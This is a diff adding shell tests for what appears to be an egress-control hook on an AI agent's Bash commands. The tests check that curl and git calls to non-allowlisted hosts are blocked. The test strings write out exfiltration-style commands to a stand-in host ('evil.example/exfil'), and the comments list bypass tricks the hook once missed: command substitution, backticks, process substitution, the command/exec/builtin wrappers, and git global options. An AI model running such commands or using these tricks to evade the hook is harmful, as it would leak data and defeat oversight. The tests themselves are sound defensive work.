@@ -649,6 +649,106 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
+# ---------------------------------------------------------------------------
+# Codex R3 CR2-A: command / process / backtick substitution must be
+# inspected too. Previously `echo $(curl evil.example)` allowed because
+# cli=`echo` and the curl inside `$(…)` was invisible.
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (Codex CR2-A): \$(...) substitution with curl inside is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'echo $(curl https://evil.example/exfil)'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR2-A): \$(...) substitution with allowlisted host is allowed" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'X=$(curl https://api.github.com/x) ; echo "$X"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR2-A): backtick \`curl ...\` substitution is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'X=`curl https://evil.example/exfil` ; echo $X'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-A): <(...) process substitution with curl inside is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'diff <(curl https://evil.example/a) <(echo hi)'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+# ---------------------------------------------------------------------------
+# Codex R3 CR2-B: `command` / `exec` / `builtin` shell builtins were
+# unwrapped → fell to ALLOW.
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (Codex CR2-B): 'command curl https://evil.example' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'command curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-B): 'exec curl https://evil.example' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'exec curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-B): 'builtin curl https://evil.example' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'builtin curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-B): 'command -p curl https://allowed' (allowed) works" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'command -p curl https://api.github.com/foo'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+# ---------------------------------------------------------------------------
+# Codex R3 CR2-C: git global options eaten before subcommand lookup.
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (Codex CR2-C): 'git -c protocol.version=2 clone https://evil.example' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'git -c protocol.version=2 clone https://evil.example/repo.git'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-C): 'git -C /tmp fetch https://evil.example' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'git -C /tmp fetch https://evil.example/repo.git'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR2-C): 'git --git-dir=/tmp/.git fetch https://allowed' (allowed) works" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git --git-dir=/tmp/.git fetch https://github.com/foo/bar.git'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR2-C): 'git --no-pager log' (local-only with global flag) passes through" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git --no-pager log --oneline -3'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 @test "AC-2: npm install foo (implicit registry) → fail-CLOSED block" {
   : > "$ALLOWLIST"
   run _call_hook_bash 'npm install lodash'
